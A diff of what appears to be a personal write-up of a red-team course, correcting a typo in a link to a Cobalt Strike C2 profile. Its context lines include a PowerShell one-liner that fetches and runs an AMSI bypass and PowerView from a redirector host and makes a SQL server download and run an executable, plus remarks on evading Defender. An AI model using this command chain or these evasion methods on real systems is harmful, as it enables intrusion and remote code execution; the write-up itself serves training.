@@ -53,7 +53,7 @@ Case in point would be that you need to load an AMSI-bypass to load PowerupSQL (
 powerpick iex (iwr http://rportfwd-host:8080/amsi -usebasicparsing);iex (iwr http://rportfwd-host:8080/powerview -usebasicparsing); Invoke-SQLOSCmd -Instance "db.example.domain,1433" -Command "powershell iwr 'rportfwd-host:8080/smb' -outfile c:\windows\tasks\smb.exe ; start-process c:\windows\tasks\smb.exe"
  ```
 
-My sample [c2 profile](https://raw.githubusercontent.com/kaywoz/redstuff/main/cobalstrike/webbug.profile) is here and the [AMSI](https://raw.githubusercontent.com/kaywoz/redstuff/main/powershell/amsibypass.ps1) used is straight from the course although I tried some others freely available on Gitbhub etc.
+My sample [c2 profile](https://raw.githubusercontent.com/kaywoz/redstuff/main/cobaltstrike/webbug.profile) is here and the [AMSI](https://raw.githubusercontent.com/kaywoz/redstuff/main/powershell/amsibypass.ps1) used is straight from the course although I tried some others freely available on Gitbhub etc.
 
 The difficulty level increased to say the least. A lot of the time was spent getting these kinds of things right, a lot of backsearching the discord for how or if a tool works with Defender on, how to change the payload to not get detected etc. 
 
